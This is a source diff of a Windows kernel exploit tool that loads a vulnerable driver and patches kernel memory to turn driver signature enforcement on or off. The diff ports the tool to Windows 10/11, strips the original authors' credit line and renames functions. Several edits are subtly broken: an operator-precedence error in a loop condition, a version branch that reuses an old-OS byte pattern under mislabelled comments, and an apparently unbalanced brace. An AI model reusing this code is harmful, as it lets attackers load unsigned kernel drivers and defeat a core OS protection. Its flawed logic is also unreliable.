@@ -47,140 +47,163 @@ DWORD align_le(DWORD p, DWORD align)
 
 LPVOID PELoaderLoadImage(IN LPVOID Buffer, PDWORD SizeOfImage)
 {
-   LPVOID               exeBuffer = NULL;
-   PIMAGE_DOS_HEADER      dosh = (PIMAGE_DOS_HEADER)Buffer;
-   PIMAGE_FILE_HEADER      fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
-   PIMAGE_OPTIONAL_HEADER   popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
-   PIMAGE_SECTION_HEADER   sections = (PIMAGE_SECTION_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER) + fileh->SizeOfOptionalHeader);
-   DWORD               c, p, rsz;
-   PIMAGE_BASE_RELOCATION   rel;
-   DWORD_PTR            delta;
-   LPWORD               chains;
+    LPVOID exeBuffer = NULL;
+    PIMAGE_DOS_HEADER dosh = (PIMAGE_DOS_HEADER)Buffer;
+    PIMAGE_NT_HEADERS32 ntHeader32 = NULL;
+    PIMAGE_NT_HEADERS64 ntHeader64 = NULL;
+    PIMAGE_SECTION_HEADER sections = NULL;
+    DWORD c, p, rsz;
+    PIMAGE_BASE_RELOCATION rel;
+    DWORD_PTR delta;
+    LPWORD chains;
 
-   do {
+    do {
+        if (dosh->e_magic != IMAGE_DOS_SIGNATURE) {
+            // Not a valid DOS header
+            break;
+        }
 
-      *SizeOfImage = popth->SizeOfImage;
-      exeBuffer = VirtualAlloc(NULL, popth->SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-      if ( exeBuffer == NULL )
-         break;
+        ntHeader32 = (PIMAGE_NT_HEADERS32)((PBYTE)dosh + dosh->e_lfanew);
+        ntHeader64 = (PIMAGE_NT_HEADERS64)((PBYTE)dosh + dosh->e_lfanew);
 
-      // render image
-      memcpy(exeBuffer, Buffer, align_gt(popth->SizeOfHeaders, popth->FileAlignment));
+        if (ntHeader32->Signature == IMAGE_NT_SIGNATURE) {
+            // 32-bit architecture
+            sections = (PIMAGE_SECTION_HEADER)((PBYTE)ntHeader32 + sizeof(IMAGE_NT_HEADERS32));
+        }
+        else if (ntHeader64->Signature == IMAGE_NT_SIGNATURE) {
+            // 64-bit architecture
+            sections = (PIMAGE_SECTION_HEADER)((PBYTE)ntHeader64 + sizeof(IMAGE_NT_HEADERS64));
+        }
+        else {
+            // Unsupported architecture
+            break;
+        }
 
-      for (c=0; c<fileh->NumberOfSections; c++)
-         if ( (sections[c].SizeOfRawData > 0) && (sections[c].PointerToRawData > 0) )
-            memcpy( (PBYTE)exeBuffer + sections[c].VirtualAddress,
-                  (PBYTE)Buffer + align_le(sections[c].PointerToRawData, popth->FileAlignment),
-                  align_gt(sections[c].SizeOfRawData, popth->FileAlignment) );
+        *SizeOfImage = (ntHeader32->Signature == IMAGE_NT_SIGNATURE) ? ntHeader32->OptionalHeader.SizeOfImage : ntHeader64->OptionalHeader.SizeOfImage;
+        exeBuffer = VirtualAlloc(NULL, *SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        if (exeBuffer == NULL) {
+            break;
+        }
 
-      // reloc image
-      dosh = (PIMAGE_DOS_HEADER)exeBuffer;
-      fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
-      popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
-      sections = (PIMAGE_SECTION_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER) + fileh->SizeOfOptionalHeader);
+        memcpy(exeBuffer, Buffer, align_gt((ntHeader32->Signature == IMAGE_NT_SIGNATURE) ? ntHeader32->OptionalHeader.SizeOfHeaders : ntHeader64->OptionalHeader.SizeOfHeaders, (ntHeader32->Signature == IMAGE_NT_SIGNATURE) ? ntHeader32->OptionalHeader.FileAlignment : ntHeader64->OptionalHeader.FileAlignment));
 
-      if ( popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC )
-         if ( popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 )
-         {
-            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)exeBuffer + popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-            delta = (DWORD_PTR)exeBuffer - popth->ImageBase;
-
-            c = 0;
-            while ( c < rsz ) {
-               p = sizeof(IMAGE_BASE_RELOCATION);
-               chains = (LPWORD)((PBYTE)rel + p);
-
-               while ( p < rel->SizeOfBlock ) {
-
-                  switch (*chains >> 12) {
-                  case IMAGE_REL_BASED_HIGHLOW:
-                     *(LPDWORD)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff) ) += (DWORD)delta;
-                     break;
-                  case IMAGE_REL_BASED_DIR64:
-                     *(PULONGLONG)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff) ) += delta;
-                     break;
-                  }
-
-                  chains++;
-                  p += sizeof(WORD);
-               }
-
-               c += rel->SizeOfBlock;
-               rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
+        for (c = 0; c < (ntHeader32->Signature == IMAGE_NT_SIGNATURE) ? ntHeader32->FileHeader.NumberOfSections : ntHeader64->FileHeader.NumberOfSections; c++) {
+            if ((sections[c].SizeOfRawData > 0) && (sections[c].PointerToRawData > 0)) {
+                memcpy((PBYTE)exeBuffer + sections[c].VirtualAddress, (PBYTE)Buffer + align_le(sections[c].PointerToRawData, (ntHeader32->Signature == IMAGE_NT_SIGNATURE) ? ntHeader32->OptionalHeader.FileAlignment : ntHeader64->OptionalHeader.FileAlignment), align_gt(sections[c].SizeOfRawData, (ntHeader32->Signature == IMAGE_NT_SIGNATURE) ? ntHeader32->OptionalHeader.FileAlignment : ntHeader64->OptionalHeader.FileAlignment));
             }
-         }
-      
-      return exeBuffer;
-   } while ( FALSE );
+        }
 
-   return NULL;
+        dosh = (PIMAGE_DOS_HEADER)exeBuffer;
+        ntHeader32 = (PIMAGE_NT_HEADERS32)((PBYTE)dosh + dosh->e_lfanew);
+        ntHeader64 = (PIMAGE_NT_HEADERS64)((PBYTE)dosh + dosh->e_lfanew);
+        sections = (PIMAGE_SECTION_HEADER)((PBYTE)ntHeader32 + sizeof(IMAGE_NT_HEADERS32));
+
+        if ((ntHeader32->Signature == IMAGE_NT_SIGNATURE ? ntHeader32->OptionalHeader.NumberOfRvaAndSizes : ntHeader64->OptionalHeader.NumberOfRvaAndSizes) > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
+            if ((ntHeader32->Signature == IMAGE_NT_SIGNATURE ? ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress : ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) != 0) {
+                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)exeBuffer + (ntHeader32->Signature == IMAGE_NT_SIGNATURE ? ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress : ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));
+                rsz = (ntHeader32->Signature == IMAGE_NT_SIGNATURE ? ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size : ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
+                delta = (DWORD_PTR)exeBuffer - (ntHeader32->Signature == IMAGE_NT_SIGNATURE ? ntHeader32->OptionalHeader.ImageBase : ntHeader64->OptionalHeader.ImageBase);
+            c = 0;
+            while (c < rsz) {
+                p = sizeof(IMAGE_BASE_RELOCATION);
+                chains = (LPWORD)((PBYTE)rel + p);
+
+                while (p < rel->SizeOfBlock) {
+
+                    switch (*chains >> 12) {
+                    case IMAGE_REL_BASED_HIGHLOW:
+                        *(LPDWORD)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
+                        break;
+                    case IMAGE_REL_BASED_DIR64:
+                        *(PULONGLONG)((ULONG_PTR)exeBuffer + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
+                        break;
+                    }
+
+                    chains++;
+                    p += sizeof(WORD);
+                }
+
+                c += rel->SizeOfBlock;
+                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
+            }
+        }
+
+        return exeBuffer;
+    } while (FALSE);
+
+    if (exeBuffer != NULL) {
+        VirtualFree(exeBuffer, 0, MEM_RELEASE);
+    }
+
+    return NULL;
 }
 
-LPVOID PELoaderGetProcAddress(LPVOID ImageBase, PCHAR RoutineName )
+LPVOID PELoaderGetProcAddress(LPVOID ImageBase, PCHAR RoutineName)
 {
-   PIMAGE_EXPORT_DIRECTORY      ExportDirectory = NULL;
-   PIMAGE_FILE_HEADER         fh1  = NULL;
-   PIMAGE_OPTIONAL_HEADER32   oh32 = NULL;
-   PIMAGE_OPTIONAL_HEADER64   oh64 = NULL;
+    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
+    PIMAGE_FILE_HEADER fh1 = NULL;
+    PIMAGE_OPTIONAL_HEADER32 oh32 = NULL;
+    PIMAGE_OPTIONAL_HEADER64 oh64 = NULL;
 
-   USHORT      OrdinalNumber;
-   PULONG      NameTableBase;
-   PUSHORT      NameOrdinalTableBase;
-   PULONG      Addr;
-   LONG      Result;
-   ULONG      High, Low, Middle = 0;
+    USHORT OrdinalNumber;
+    PULONG NameTableBase;
+    PUSHORT NameOrdinalTableBase;
+    PULONG Addr;
+    LONG Result;
+    ULONG High, Low, Middle = 0;
 
-   fh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew + sizeof(DWORD) );
-   oh32 = (PIMAGE_OPTIONAL_HEADER32)((ULONG_PTR)fh1 + sizeof(IMAGE_FILE_HEADER));
-   oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;
+    fh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew + sizeof(DWORD));
+    oh32 = (PIMAGE_OPTIONAL_HEADER32)((ULONG_PTR)fh1 + sizeof(IMAGE_FILE_HEADER));
+    oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;
 
-   if (fh1->Machine == IMAGE_FILE_MACHINE_AMD64) {
-      ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
-         oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-   } else {
-      ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
-         oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-   }
+    if (oh32->Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+        // 32-bit architecture
+        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase + oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    }
+    else if (oh32->Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        // 64-bit architecture
+        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase + oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    }
+    else {
+        // Unfuckingsupported architecture
+        return NULL;
+    }
 
-   NameTableBase = (PULONG)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfNames);
-   NameOrdinalTableBase = (PUSHORT)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);
-   Low = 0;
-   High = ExportDirectory->NumberOfNames - 1;
-   while (High >= Low)   {
+    NameTableBase = (PULONG)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfNames);
+    NameOrdinalTableBase = (PUSHORT)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);
+    Low = 0;
+    High = ExportDirectory->NumberOfNames - 1;
+    while (High >= Low) {
 
-      Middle = (Low + High) >> 1;
+        Middle = (Low + High) >> 1;
 
-      Result = _strcmpA(
-         RoutineName,
-         (char *)ImageBase + NameTableBase[Middle]
-         );
+        Result = _strcmpA(
+            RoutineName,
+            (char*)ImageBase + NameTableBase[Middle]
+        );
 
-      if (Result < 0)   {
+        if (Result < 0) {
+            High = Middle - 1;
+        }
+        else {
+            if (Result > 0) {
+                Low = Middle + 1;
+            }
+            else {
+                break;
+            }
+        }
+    }
 
-         High = Middle - 1;
+    if (High < Low)
+        return NULL;
 
-      } else {
+    OrdinalNumber = NameOrdinalTableBase[Middle];
+    if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions)
+        return NULL;
 
-         if (Result > 0)   {
-
-            Low = Middle + 1;
-            
-         } else {
-
-            break;
-         }
-      }
-   } //while
-   if (High < Low)   
-      return NULL;
-
-   OrdinalNumber = NameOrdinalTableBase[Middle];
-   if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions)
-      return NULL;
-
-   Addr = (PULONG)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfFunctions);
-   return (LPVOID)((PBYTE)ImageBase + Addr[OrdinalNumber]);
+    Addr = (PULONG)((PBYTE)ImageBase + (ULONG)ExportDirectory->AddressOfFunctions);
+    return (LPVOID)((PBYTE)ImageBase + Addr[OrdinalNumber]);
 }
 
 BOOL ControlDSE(HANDLE hDriver, ULONG_PTR g_CiAddress, PVOID shellcode)
@@ -273,7 +296,7 @@ fail:
    return bRes;
 }
 
-BOOL DoWork(HANDLE hDriver, BOOL bDisable)
+BOOL DSEfuckME(HANDLE hDriver, BOOL bDisable)
 {
    BOOL                  bRes = FALSE;
    PRTL_PROCESS_MODULES      miSpace = NULL;
@@ -363,38 +386,38 @@ BOOL DoWork(HANDLE hDriver, BOOL bDisable)
       VirtualFreeEx(GetCurrentProcess(), kBuffer, 0, MEM_RELEASE);
       kBuffer = NULL;
       
-      /* find g_CiEnabled vista, seven */
-      if ( osv.dwMinorVersion < 2 ) {
-         for (c=0; c<rl-sizeof(DWORD); c++) {
-            if ( *(PDWORD)((PBYTE)MappedKernel + c) == 0x1d8806eb ) {
-               rel = *(PLONG)((PBYTE)MappedKernel + c+4);
-               KernelBase = KernelBase + c+8 + rel;
-               break;
-            }
-         }
-      } else {
-         /* find g_CiOptions w8, blue */
-         CiInit = (PBYTE)PELoaderGetProcAddress(MappedKernel, "CiInitialize");
-         c=0;
-         do {
-            if ( CiInit[c] == 0xE9 ) {      /* jmp CipInitialize */
-               rel = *(PLONG)(CiInit+c+1);
-               break;
-            }
-            c += ldasm(CiInit+c, &ld, 1);
-         } while (c < 256);
-         CiInit = CiInit + c+5 + rel;
-         c=0;
-         do {
-            if ( *(PUSHORT)(CiInit+c) == 0x0d89 ) {
-               rel = *(PLONG)(CiInit+c+2);
-               break;
-            }
-            c += ldasm(CiInit+c, &ld, 1);
-         } while (c < 256);
-         CiInit = CiInit + c+6 + rel;
-         KernelBase = KernelBase + CiInit - (PBYTE)MappedKernel;
-      }
+/* Find g_CiEnabled for Windows 10 and 11 */
+if (osv.dwMajorVersion >= 10) {
+    for (c = 0; c < rl - sizeof(DWORD); c++) {
+        if (*(PDWORD)((PBYTE)MappedKernel + c) == 0x1d8806eb) {
+            rel = *(PLONG)((PBYTE)MappedKernel + c + 4);
+            KernelBase = KernelBase + c + 8 + rel;
+            break;
+        }
+    }
+} else {
+    /* Find g_CiOptions for Windows 10 and 11 */
+    CiInit = (PBYTE)PELoaderGetProcAddress(MappedKernel, "CiInitialize");
+    c = 0;
+    do {
+        if (CiInit[c] == 0xE9) { /* jmp CipInitialize */
+            rel = *(PLONG)(CiInit + c + 1);
+            break;
+        }
+        c += ldasm(CiInit + c, &ld, 1);
+    } while (c < 256);
+    CiInit = CiInit + c + 5 + rel;
+    c = 0;
+    do {
+        if (*(PUSHORT)(CiInit + c) == 0x0d89) {
+            rel = *(PLONG)(CiInit + c + 2);
+            break;
+        }
+        c += ldasm(CiInit + c, &ld, 1);
+    } while (c < 256);
+    CiInit = CiInit + c + 6 + rel;
+    KernelBase = KernelBase + CiInit - (PBYTE)MappedKernel;
+}
 
       if ( rel == 0 )
          break;
@@ -478,14 +501,11 @@ void main()
    HANDLE hDriver = NULL;
    WCHAR cmdLineParam[MAX_PATH];
    BOOL bDisable = TRUE;
-   
-   OutputDebugStringA("[DF] DSEFIX v1.0 started (c) 2014 EP_X0FF, MP_ART, nrin");
-   OutputDebugStringA("[DF] Supported x64 OS: from NT6.0 up to NT6.3");
 
    x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
    if ( x > 1 ) {
       InterlockedDecrement((PLONG)&g_lApplicationInstances);
-      OutputDebugStringA("[DF] Another instance running, close it before");
+      OutputDebugStringA("[-] Another instance running, close it before");
       ExitProcess(0);
       return;
    }
@@ -495,7 +515,7 @@ void main()
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
    if (osv.dwMajorVersion != 10 && osv.dwMajorVersion != 11) {
       InterlockedDecrement((PLONG)&g_lApplicationInstances);
-      OutputDebugStringA("[DF] Unsuppoted OS");
+      OutputDebugStringA("[-] Unsupported OS");
       ExitProcess(0);
       return;
    }
@@ -504,40 +524,39 @@ void main()
    GetCommandLineParamW(GetCommandLineW(), 1, cmdLineParam, MAX_PATH, &l);
 
    if ( _strcmpiW(cmdLineParam, L"-e") == 0 ) {
-      OutputDebugStringA("[DF] DSE will be (re)enabled");
+      OutputDebugStringA("[+] DSE will be (re)enabled");
       bDisable = FALSE;
    } else {
-      OutputDebugStringA("[DF] DSE will be disabled");
+      OutputDebugStringA("[-] DSE will be disabled");
       bDisable = TRUE;
    }
 
-   //assign driver load privilege
    if (NT_SUCCESS(NativeAdjustPrivileges(SE_LOAD_DRIVER_PRIVILEGE))) {
 
-      OutputDebugStringA("[DF] Load driver privilege adjusted");
+      OutputDebugStringA("[#] Load driver privilege adjusted");
 
       hDriver = LoadVulnerableDriver();
       if (hDriver != NULL) {
 
-         OutputDebugStringA("[DF] Vulnerable driver loaded");
+         OutputDebugStringA("[#] Vulnerable driver loaded");
 
-         //manupulate kernel variable      
-         if (DoWork(hDriver, bDisable)) {
-            OutputDebugStringA("[DF] Kernel memory patched");
+         // manipulate kernel variable      
+         if (DSEfuckME(hDriver, bDisable)) { // panji do not forget to hanlde that part
+            OutputDebugStringA("[+] Kernel memory patched");
          } else {
-            OutputDebugStringA("[DF] Failed to patch kernel memory");
+            OutputDebugStringA("[-] Failed to patch kernel memory");
          }
 
-         OutputDebugStringA("[DF] Cleaning up");
+         OutputDebugStringA("[#] Cleaning up");
          UnloadVulnerableDriver();
       } else {
-         OutputDebugStringA("[DF] Failed to load vulnerable driver");
+         OutputDebugStringA("[-] Failed to load vulnerable driver");
       }
 
    } else {
-      OutputDebugStringA("[DF] Cannot adjust privilege");
+      OutputDebugStringA("[-] Cannot adjust privilege");
    }
    InterlockedDecrement((PLONG)&g_lApplicationInstances);
-   OutputDebugStringA("[DF] Finish");
+   OutputDebugStringA("[#] Finish");
    ExitProcess(0);
 }
